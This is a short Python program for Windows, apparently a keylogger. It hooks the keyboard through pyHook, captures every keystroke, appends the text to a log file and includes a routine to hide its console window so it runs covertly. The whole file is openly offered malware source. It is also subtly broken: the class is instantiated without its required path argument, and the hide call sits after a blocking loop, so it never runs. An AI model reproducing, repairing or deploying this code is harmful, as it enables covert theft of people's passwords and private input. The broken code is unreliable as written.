import pyHook
import pythoncom

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

class keyLogger:

    def __init__(self,path):
        self.data = ''
        self.path = path

    def keypressed(self,event):
        if event.Ascii==13:
            keys='<ENTER>'
        elif event.Ascii==8:
            keys='<BACKSPACE>'
        elif event.Ascii==9:
            keys='<TAB>'
        else:
            keys=chr(event.Ascii)
        self.data=self.data+keys 
        self.local()

    def local(self):
        if len(self.data)>30:
            fp=open(self.path,"a")
            fp.write(self.data)
            fp.close()
            self.data=''

    def run(self):
        obj = pyHook.HookManager()
        obj.KeyDown = self.keypressed
        obj.HookKeyboard()
        pythoncom.PumpMessages()

if __name__ == '__main__':
    keyLogger().run()
    hide()